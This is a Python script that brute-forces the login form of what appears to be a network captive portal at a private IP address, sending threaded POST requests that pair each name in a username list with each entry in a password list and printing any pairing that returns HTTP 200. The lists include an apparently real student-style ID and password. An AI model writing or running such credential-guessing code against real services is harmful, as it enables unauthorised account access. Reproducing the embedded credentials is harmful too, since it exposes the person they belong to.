import requests
import threading
import time

# Set the URL of the login form
url = 'https://192.168.254.1:8090/httpclient.html'

# Set the username and password lists to try
usernames = ['PES1202300738', 'user2', 'user3']
passwords = ['Laxman06', 'password2', 'password3']

# Set the number of threads to use
num_threads = 10

# Define a function to perform a single login attempt
def login_attempt(username, password):
    # Set the request headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }

    # Set the request data
    data = {
        'username': username,
        'password': password
    }

    # Send the HTTP request
    response = requests.post(url, headers=headers, data=data)

    # Check the response status code
    if response.status_code == 200:
        print(f'Successful login: {username}:{password}')

# Create a list of threads
threads = []

# Start the threads
start_time = time.time()
for username in usernames:
    for password in passwords:
        thread = threading.Thread(target=login_attempt, args=(username, password))
        thread.start()
        threads.append(thread)

        # Limit the number of concurrent threads
        if len(threads) >= num_threads:
            for thread in threads:
                thread.join()
            threads = []

# Wait for all threads to complete
for thread in threads:
    thread.join()

# Print the elapsed time
end_time = time.time()
print(f'Elapsed time: {end_time - start_time:.2f} seconds')